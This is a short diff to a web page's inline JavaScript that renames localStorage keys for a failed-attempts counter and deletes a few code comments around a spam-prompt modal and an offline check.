-    const getAttempts = () => parseInt(localStorage.getItem('zc_failed_attempts') || '0');
-    const setAttempts = (val) => localStorage.setItem('zc_failed_attempts', val);
+    const getAttempts = () => parseInt(localStorage.getItem('nyota_failed_attempts') || '0');
+    const setAttempts = (val) => localStorage.setItem('nyota_failed_attempts', val);
 
     function showSpamPrompt(remaining, onOkCallback) {
         const existingModal = document.getElementById('spam-prompt-modal');
         if (existingModal) existingModal.remove();
 
-        // Fix: Replaced inline onclick with a unique ID and addEventListener below
         const modalHTML = `
             <div id="spam-prompt-modal" class="fixed inset-0 z-[100000] bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-6">
                 <div class="spam-modal bg-white rounded-2xl p-6 w-full max-w-sm shadow-2xl">
@@ -1353,7 +1390,6 @@ function retryPayment(){
         `;
         document.body.insertAdjacentHTML('beforeend', modalHTML);
 
-        // Fix: Attach event listener properly
         document.getElementById('spam-modal-ok-btn').addEventListener('click', () => {
             document.getElementById('spam-prompt-modal')?.remove();
             if (typeof onOkCallback === 'function') onOkCallback();
@@ -1446,7 +1482,6 @@ function retryPayment(){
     });
 })();
 
-// Initial Offline Check on any page boot
 if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
 </script>
 </body>
